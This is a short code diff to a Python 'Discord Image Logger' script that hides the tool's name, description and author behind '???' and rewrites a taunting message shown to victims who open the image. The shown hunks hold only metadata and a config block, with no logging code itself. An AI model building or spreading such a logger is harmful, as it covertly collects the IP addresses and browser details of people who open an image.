@@ -4,10 +4,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "are you dumb is a image logger mf"
+__app__ = "???"
+__description__ = "are you dumb?"
 __version__ = "v1.0 Beta"
-__author__ = "Dragonium.cc"
+__author__ = "???"
 
 config = {
     # BASE CONFIG #
@@ -27,7 +27,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "This browser has been fucked", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
